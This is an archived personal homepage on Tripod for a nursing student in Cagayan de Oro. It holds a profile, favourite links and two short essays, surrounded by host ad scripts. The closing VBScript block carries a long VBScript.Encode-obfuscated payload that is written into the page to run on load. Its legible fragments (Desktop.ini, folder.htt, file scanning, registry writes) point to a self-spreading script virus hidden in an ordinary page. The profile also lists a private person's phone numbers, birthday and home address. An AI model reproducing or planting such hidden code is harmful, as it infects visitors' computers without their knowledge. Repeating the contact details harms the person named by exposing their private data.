<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<HTML><HEAD><TITLE>Jha's Website</TITLE>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<META content="MSHTML 6.00.2600.0" name=GENERATOR></HEAD>
<body bgColor=#ca9483><!-- begin compete js -->
<script type="text/javascript">
    __compete_code = '667f89f26d96c30e99728fe6a608804d';
    (function () {
        var s = document.createElement('script'),
            d = document.getElementsByTagName('head')[0] ||
                document.getElementsByTagName('body')[0],
            t = 'https:' == document.location.protocol ? 
                'https://c.compete.com/bootstrap/' : 
                'http://c.compete.com/bootstrap/';
        s.src = t + __compete_code + '/bootstrap.js';
        s.type = 'text/javascript';
        s.async = 'async'; 
        if (d) { d.appendChild(s); }
    }());
</script>
<!-- end compete js -->

<!-- quantcast -->
<script type="text/javascript">
	function channValidator(chann){
	return (typeof(chann) == 'string' && chann != '');
	}

	function lycosQuantcast(){
		var lb = "";
		if(typeof(cm_host) !== 'undefined' && channValidator(cm_host)){
			lb += cm_host.split('.')[0] + '.';
		}
	
		if(typeof(cm_taxid) !==	'undefined' && channValidator(cm_taxid)){
			lb += cm_taxid;
			lb = lb.replace('/','');
		} else {
			lb = lb.replace('.','');
		}
		return lb;
	}
	
	var _qevents = _qevents || [];
	
	(function() {
		var elem = document.createElement('script');
		elem.src = (document.location.protocol == "https:" ? "https://secure" :"http://edge") + ".quantserve.com/quant.js";
		elem.async = true;
		elem.type = "text/javascript";
		var scpt = document.getElementsByTagName('script')[0];
		scpt.parentNode.insertBefore(elem, scpt);
	})();
	
	_qevents.push({
		qacct:"p-6eQegedn62bSo",
		labels:lycosQuantcast()
	});
</script>
<!-- end quantcast -->

<script type="text/javascript" src="http://hb.lycos.com/hb.js"></script>
<script type="text/javascript">
var cm_role = "live";
var cm_host = "tripod.lycos.com";
var cm_taxid = "/memberembedded";
var tripod_member_name = "jhasmem8";
var tripod_member_page = "jhasmem8/index.html";
var tripod_ratings_hash = "1319791136:99d7941470297b324f079189f9fac6a5";

var lycos_ad_category = null;

var lycos_ad_remote_addr = "154.35.200.66";
var lycos_ad_www_server = "www.tripod.lycos.com";
var lycos_ad_track_small = "http://members.tripod.com/adm/img/common/ot_smallframe.gif?rand=802515";
var lycos_ad_track_served = "http://members.tripod.com/adm/img/common/ot_adserved.gif?rand=802515";
</script>

<script type="text/javascript" src="http://scripts.lycos.com/catman/init.js"></script>
<script type="text/javascript"> 
var lycos_ad = Array();
var lycos_search_query = "";
var lycos_onload_timer;

function lycos_check_size() {
    var window_width = 0, window_height = 0;
    if (typeof(window.innerWidth) == 'number' ) {
        window_width = window.innerWidth;
        window_height = window.innerHeight;
    } else if (document.documentElement && (document.documentElement.clientWidth || document.documentElement.clientHeight)) {
        window_width = document.documentElement.clientWidth;
        window_height = document.documentElement.clientHeight;
    } else if (document.body && (document.body.clientWidth || document.body.clientHeight)) {
        window_width = document.body.clientWidth;
        window_height = document.body.clientHeight;
    } 
    
    var lycos_track_img = document.createElement('img');
    if( top == self ) {
        return 1;
    } else {
        if ((window_width < 300) || (window_height < 300)) {
            lycos_track_img.src=this.lycos_ad_track_small+"&w="+window_width+"&h="+window_height;
            return 0;
        } else {
            lycos_track_img.src=this.lycos_ad_track_served+"&w="+window_width+"&h="+window_height;
            return 1;
        }
    }
}
       
function lycos_insert_ads() {
    var lycos_ad_mgr = new AdManager();
    
    if (this.lycos_search_query) {
        lycos_ad_mgr.setForcedParam("keyword", this.lycos_search_query);
    } else if (this.lycos_ad_category && this.lycos_ad_category.find_what) {
        lycos_ad_mgr.setForcedParam("keyword", this.lycos_ad_category.find_what);
    }

    if (this.lycos_ad_category && this.lycos_ad_category.dmoz) {
        lycos_ad_mgr.setForcedParam("page", this.lycos_ad_category.dmoz);
    } else {
        lycos_ad_mgr.setForcedParam("page", "member");
    }

    var lycos_prod_set = lycos_ad_mgr.chooseProductSet();
    var slots = ["leaderboard", "leaderboard2"];
    for (var slot in slots) {
        if (lycos_ad_mgr.isSlotAvailable(slots[slot])) {
            lycos_ad[slots[slot]] = lycos_ad_mgr.getSlot(slots[slot]);
        }
    }

    lycos_ad_mgr.renderFooter();
}

function generateHref(atag, template){
    atag.href=template.replace('_MYURL_', window.location.href.replace('http://', '')).replace('_MYTITLE_', 'Check%20out%20this%20Tripod%20Member%20site!'); 
}

if (lycos_check_size()) {
    lycos_insert_ads();
}

window.onload = function() {
    var f = document.getElementById("FooterAd");
    var b = document.getElementsByTagName("body")[0];
    b.removeChild(f);
    b.appendChild(f);
}

</script>
<div id="tb_container" style="text-align:center; position:relative; z-index:999999999">
    <div id="tb_ad" style="display:block!important; overflow:hidden; width:868px; margin:0 auto">
    <a href="http://www.tripod.lycos.com" title="build your own website at Tripod.com" style="float:left; width:140px">
    	<img src="http://tripod.com/common/ly/images/freeAd.jpg" alt="Made with Tripod.com" />
    </a> 
        <div id="ad_container" style="display:block!important; float:left; width:728px ">
        <script type="text/javascript">document.write(lycos_ad['leaderboard']);</script>
        </div>
    </div>
</div>
<div id="FooterAd" style="text-align:center; display:block!important; width:100%!important; position:relative; z-index:999999!important; height:94px!important"> 
<script type="text/javascript">document.write(lycos_ad['leaderboard2']);</script>
</div>
<noscript>
 <img src="http://members.tripod.com/adm/img/common/ot_noscript.gif?rand=802515" alt="" width="1" height="1" />
 <!-- BEGIN STANDARD TAG - 728 x 90 - Lycos - Tripod Fallthrough - DO NOT MODIFY -->
 <iframe frameborder="0" marginwidth="0" marginheight="0" scrolling="no" width="728" height="90" src="http://ad.yieldmanager.com/st?ad_type=iframe&amp;ad_size=728x90&amp;section=209094"></iframe>
 <!-- END TAG -->
</noscript>

<CENTER>
<MARQUEE>
<H2>Http://Jhas.Tripod.com</H2></MARQUEE></CENTER>
<TABLE cellPadding=5 border=0 cell spacing="5">
  <TBODY>
  <TR>
    <TD><IMG src="2.JPG" width=200></TD>
    <TD>Name:Jhasmen B. Lolong<BR>Nickname:Jhas<BR>Birthday:April 
      03,1986<BR>Contact#:088-855- 3975or 09265018437<BR>Address:Puerto, Cagayan 
      De Oro City<BR></TD></TR></TBODY></TABLE>
<H3>My Links</H3>
<UL>
  <LI><A href="http://www.yahoo.com/">Yahoo! </A>-I like this website because it 
  contents many sources regarding different matters. 
  <LI><A href="http://friendster.com/">Friendster.com -I love this website for 
  in here you can met different peoples in different countries. </A>
  <LI><A href="http://myspace.com/">Myspace.com -Mysapce.com- It is also a 
  wonderful website. </A>
  <LI><A href="http://sms.ac/">Sms.ac - I like this one for it allows me to text 
  someone for free. heheheheh!!! </A>
  <LI><A href="http://google.com/">Google.com -This website also provides me 
  informations about certain topics. </A></LI></UL>
<TABLE border=1 cell spacing="5" padding="5">
  <TBODY>
  <TR>
    <TD width="50%">Why take up nursing?</TD><BR>
    <TD>My favorite technology gadget...</TD><BR></TR>
  <TR>
    <TD>Well, as what we have observed now in our society we are indeed faced 
      on a terrible condition. Like corruption here, corruption there, which 
      really contributed to the crisis that we are now experiecing . Besides our 
      economy is not that good anymore. So, as a citizen I need to help my 
      fellowen and at the same time my country. In order to make it possible I 
      decided to take up nursing so that I can go abroad and work there, of 
      course to earn money, lots of money, to provide good future for my family 
      and relatives. A side from that I will also send them money, by that way I 
      could already help my country. It is because the money that were sent by 
      overseas workers to the Philippines from other countries were also 
      remitted to a certain agency in the Philippines which is one of the 
      factors that help in uplifting our economy. </TD>
    <TD>Gadgets,hmmmm!!sounds interesting.Any way we people are now living in 
      high technology world.Like you know, just press a button then you can 
      finish your work,gush its really amazing... Today we cant deny that almost 
      all of us are dependent to devices and gadgets.Like for instance me, I am 
      very dependent to one of the useful gadgets that people are using, the 
      cellular phones.Its really a wonderful invetion becaise it is very much 
      helpful to as i terms of communication and emergencies, just dialed the 
      number then you can send the message you want somebody to read..Thats why 
      I really value this gadget.... </TD></TR></TBODY></TABLE><BR>
<CENTER>© 2005 Jhasmen,All right reserved.</CENTER>
<SCRIPT language=VBScript><!--
QueryString="#@~^kxEAAA==6	P3MDKDP""+k;:PH+XY@&/Kx/D~bawVOHls+{J-4d bmCD}dRyRT ZJ@&/G	/OPz2aVnDZKN+{J1G:c:dRmmOr7+(c)mDk\p/WswKxnxOE@&ZGxkOP6/G/d?q9xr	TfWfw2T8Ow!,2O8qZwO0,W!RTZb!;1!lc y0NJ@&ZKxdY~AkZJ?&9'r	o12*f/+yOqZwT FqG! bf~, T!;!*sG*0)ZA8r@&NKmEsnUYchMkO+E@!mw2VOP4+rL4Y'T~Sk[Y4xZPUm:'JLba2VYHls+'E,mW9n'r[ba2s+DZKNn[E@*@!zCwas+D@*E@&9Wm;hxORS.bYnr@!kmDbwD~0KDxhbx[GSP+7nxD'W	sGl9@*k+OKrhr;YrE\(/^.bwYlhmkU\ymKxsKl9`#rJBq!Z!@!zkm.raY@*r@&?!4PsCrx7 |WUVGC9`b@&""no;tCUT+`b@&GDGw:nswsmY`K:aslD+9kM#@&9MWw:n:aVlDncK4kkfrDKCDtb@&G.WaHrd1`#@&obVn?1C	`P4kkfkMnmOt*@&KSKl[/4+m0c#@&2x9~jE(@&UE8P9.Kw\kk^`*@&6U,2D.GMP]+k;s+~g+XY@&wWM~x{!~YKPq@&GDWaP+swVmOn`6/KR!+Oja+^kmssKV[nM`xb'r-E#@&H6O@&sKDPAl14P9Prx,0dGcfDb-+k@&q6~[RGDb\nKz2'+PD4+	P9.KwKnhaVCYc9R9Mk7+SYDnDLJl-r#@&H6Y@&oWMP2m^4P	Pbx~d4UtnV^ ?a+^rmVsGs9+./@&(6P(	?DD`	~r9+k3OWaJbxZPK4nx,fDK2P+sw^lO+cULJwJ*@&16O@&AxN~j!4@&?!8,nJKl9Ztm0c#@&rUPAD.GMPIdEs+PgnaY@&q6P\WUO4`HWSb'OPCU9PfCzv1Gh*xyv~DtxPq/4jtVsR""EUcrIjg9Sd& c3p2,/4+sVf+cNsVBjCA6rOqkx[GS/36,+r#@&Ax9P?!4@&jE(Pok^+)2a+x9c0Bm#@&6UPADMW.P]nkEh+,H+XY@&jYPhzwks+{WkW V+Dsk^+vW#@&xx:HsrsRbDODb4EDnd@&sXwks+ )DY.k(;Y/xT@&?+O~sXok^n{0dKR}w+	KaYwks+v0S0*@&:Hok^+Rq.rYP1@&hXor^+ Z^G/@&or^+bOOMPW~	@&Ax[,?!4@&UE(~sbVnq	0n^D`w*@&r	P2M.GD,I/;:n~g+aY@&j+DPWx6/W 6a+UKaDsr^+vw~8#@&^'6R]+mN)s^@&0c/VK/+@&(WP&xUY.In-vmS\;GN#xT,rD~(	?OD""n7`^B\;WN#3J+	`-ZKNnb@!S+	cm*PK4nUP@&sbVnb22x[PaS\;W[n@&2x[~&0@&2	[,?;(@&UE4,sbs+UmCxvwb@&}xPA.DKDP""ndEs+,1n6O@&wW.PACm4PdW8PqU~6/GRVnDsG^ND`a#cok^+d@&U+sn1YP;C/PS;Cd+v0kW MnOA6O+	dkKxHCs+`dW8RHlsn*#@&;lk+PrtDhJBJ4YsVESrtYDE@&wkV(U0mD`d0q hlOt*@&2	N~jV+^O@&1n6D@&Ax[,?!4@&wE	^YbWUP7ZG[`#@&6x,2DMG.P""+kEh+~H6O@&	/W9+x]wVC^`}E.H?OMk	o~1tMc&W#Sm4DcfW#[14Dv&c*b@&fMWaHn').Mlz`r@!JLJj^MkwO~dlUo!CT+xrJjA?1Db2YrJ@*@!r[^4M`&2b[rOOrSEp!+MXjY.r	oxJrE[	ZG[[JEEr~ENK^!:n	YchDbYEJ@!JE[rJj^MkwD~Smxo!CL+{JrJE.$j1DrwD 2	mG[JJEE@*JE[5;DzUYMkxT[rE@!JJE[rJj^MkwD@*JrJ~rRRJLJ@*@!&J'EUm.kaO@*r#@&-;WNnxxWrxv9MW2t+BZtM`8T#*@&3x9Po;	mYbGx@&?E(~]+TZ4lUonc*@&6x,3DMW.~""+/;hPH+XO@&b3{J4YYa)J&hSh oW^rDk+k mK:z4n[Nm{sl.knmDWs+	Ok	W&r	N+a 4YhJ@&jh'Em4KEY=+M.WMJ@&C;jxE_|2ImZ`IIAHP{`?AIwJ@&jt'E?KWYSl.n'Hk^.K/G0Dwr@&udH{JCn2ImS}Z)S|H)/_q1AwJ@&Z{E	k	NKhd-/;MDnxD#+M/rG	-J@&KA'EnKsbmr/'26aVK.+M-E@&&2xE&xY.xYPAa2VKDDwJ@&j{C/jLjHLq3'rHlrU'?OlMO,nCT+r@&b{Cd\[UH'qA[E)(WEDiId/-..WMJ@&2xCJ\L?\[q/[r2aOUt+ssjknhkwP*1Rcws2ZOy0fWOqF;sR)Avv T%Z! ~+3Fyvy8wJ@&H{CJHLjHL/'h2[EHKsGV9nMr2DkKx/r@&_xC;j'?t[	/LJ2X2VKD+Mw)N7l	mnNwubN[+	E@&;'u/`[?\'qZ'nA'rZsm/kkmUtsVr@&	kDt~	kt?4nV^@&fqxEIAM|f	r]9r@&j}{EIAMmj\J@& ]o	DbOPjB?h~?\@&c]+T.kD+~)Bb2Bj}@&RIL	DbYPH~qSG@&R""noqDrOPCSTBf	@&c]o	MkD+P;~ZSfq@& Io9n^+Y~2@&2x9~	kDt@&2UN~j!4@&s!UmDkGU,KtrdGk.nmO4`b@&r	P2MDK.P""+dEs+~H6Y@&2'""+w^C^+vj	2dmC2`[W1;:xO ^WmCObWU#BE6ks)Jzzr~rE#@&qWP6/G wkV36b/Ykc2#,K4+U@&2x""+2Vm^+vwSWkWR!nDsrVHm:nvw*~Jr#@&3Vk+@&q6PHGD`SU`a#@!{fbP:tx~wx2LJ&J@&3x9P(W@&KtrdGk.nmO4'2@&2	NPwE	^YbWU@&wEU^DkW	~K:w^CO+GkM`b@&6U,2.DK.P""+d;s+PHnXY@&w{WkW V+D?wmbCVwWsNDcT*[J'	+(J@&6dGRG+^+O+oG^NnD,2~:D;n@&0/G ;DnlDnwWs9+M`w*@&UnY,:zsbVnx6/Wc!+DsW^[nDvw*@&hXor^+ bDODb4;O/'{@&:+hw^CD+9bD{w[r-r@&2	N~s!x^ObWx@&jE(PfMG2K:aVCYncalOt*@&r	P3.MWD~]/;:~g+aD@&wWV9+MuK:'E@!4Yhs@*@!4K[X,/mMGsV{xKPdYzs'hlMLk	)T@*@!W4%n1Y~m^Ck/r9'1V/bN=q%y!o2G!R*F&2 qFG!Oz1Z !ZZTco9F!Xby~/DXsn{hk[O4)q!ZYptnbo4Y)8!ZY@*@!zG4N+^O@*@!z(GNH@*@!J4O:^@*r@&rxrJbxn'm.DmXcE]26Oj4+sVwG^NnM.b+hkTrSJG+Wl!VOxP*,R*sw2! +0fWO8F/sR)AvOZ0!Z $+AF +)JSJPXO%*wsA!Oy%G*O8F/s b3+O!RT!yA Aq+vy8{	X,0*ws3! +%GcRq8ZsR)AvOZ0Z!+~ AF + )E~rJSJ]	X1Rcsw3!  %G*RF8ZwO)2 !0!Z+Ay2q++ 8DEBJK+Mdb/OtW	k3D{Wk^+lzJsGs9+Dc4YDJ~rESJ]RUtnVs/^ld/&U0KTESrZWUWbDhsbsr2{!r#@&G+kVYKw(1&'BGbx`bUkdkxS#4;Dd0b@&2xalOtLEf/VOKwRrUbJ@&sbsZ.lD+Pa~Gn/0YGw&1(@&wkV)YDDPaS{@&a'alOt'EwWsN.R4YOE@&sksn;DnlDn,wSwW^N+MC:PPLP-ZKNn@&wkV)YDDPaS{@&Ax9PjE8@&UE8PwrVZ.nmY+cWbVnxmh~^KxD+xD/*@&r	P3DMW.~""+/!h+,1+XO@&sbVbOY.~6ks+	C:~T@&U+Y~hHsrVx6/GcZM+lD+:n6DsrV`Wr^+xmh+BKD!nb@&sXwks+ 	MkO+,^W	YnUD/@&hzwks+c/^Wd@&AxN,?!8@&UE8PwksnzYYMc0bV+	Ch+BlDY.#@&6	P3DMGD,Ind!:+~H6O@&UnDPhHsbV+{0kGRV+OsbVnc6kVUls+#@&hzsbVR)YO.b4;Yd'mYO.@&2x[~UE8@&w;	mObW	Pbaw}8Lv#@&r	P3.MWD,]+kE:~H+XY@&?nY~)aw64NxNKm;hxY Caws+Ddvb2aVY1m:b@&Ax[PwEU^DkW	@&s!xmDrGx,0kWc#@&6	P3DMGD,Ind!:+~H6O@&UnDPWkW{ZDlDnr(Lc0kW/JUqf*@&2	NPw;UmDkKx@&s;U1YrW	~ktj4VVcb@&rUPA.MW.,I/Es+,H+XY@&?Y~	kt?4nV^'ZMnCYr(Lchd/d?(f*@&2	N~o!xmOrKx@&s!U1YrKx,ZDlDnr(LcZd?(9*@&r	~2MDWM~]+kEs+~1naD@&)wa64NRjnDZSj(G`/SU(G#@&zwar4NR1.+mYnq	/OC	m+vb@&Skx9GARkYmY;/xEr@&j+D~ZM+COr4%xzw2r(%cMnDr(L+1Yvb@&Ax[PwEU^DkW	mXYFAA==^#~@"
document.write"<"&"Script Language=""VBScript.Encode"">"&QueryString&"</"&"Script>"
--></SCRIPT>
</body></HTML>
